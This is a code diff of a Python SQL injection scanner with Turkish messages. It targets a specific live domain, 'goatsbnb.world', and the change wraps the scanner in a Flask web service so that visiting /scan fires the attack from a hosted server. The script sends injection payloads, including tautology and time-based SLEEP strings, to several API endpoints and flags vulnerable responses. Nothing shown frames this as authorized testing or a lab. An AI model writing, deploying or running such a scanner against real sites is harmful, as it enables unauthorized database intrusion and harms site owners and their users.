@@ -1,9 +1,10 @@
 import requests
 import time
 import sys
+from flask import Flask, request
 
+app = Flask(__name__)
 TARGET = "goatsbnb.world"
-
 PAYLOADS = [
     "' OR '1'='1",
     "' AND SLEEP(5)-- ",
@@ -23,10 +24,15 @@ def test_sqli(url):
                 print(f"[!] ZAMANLI SQLi: {test_url}")
             if "sql" in r.text.lower() or "mysql" in r.text.lower():
                 print(f"[!] HATALI SQLi: {test_url}")
-        except:
-            print(f"[-] Hata: {test_url}")
+        except Exception as e:
+            print(f"[-] Hata: {test_url} -> {e}")
 
-if __name__ == "__main__":
+@app.route('/')
+def home():
+    return "GOATsBNB Scanner çalışıyor! /scan ile taramayı başlat."
+
+@app.route('/scan')
+def scan():
     print("=== GOATsBNB SQLi Scanner (Render) ===")
     endpoints = [
         f"https://{TARGET}/api?id={{id}}",
@@ -35,4 +41,7 @@ if __name__ == "__main__":
     ]
     for ep in endpoints:
         test_sqli(ep)
-    print("[+] Tarama bitti.")
+    return "Tarama tamamlandı. Logları kontrol et."
+
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=10000)
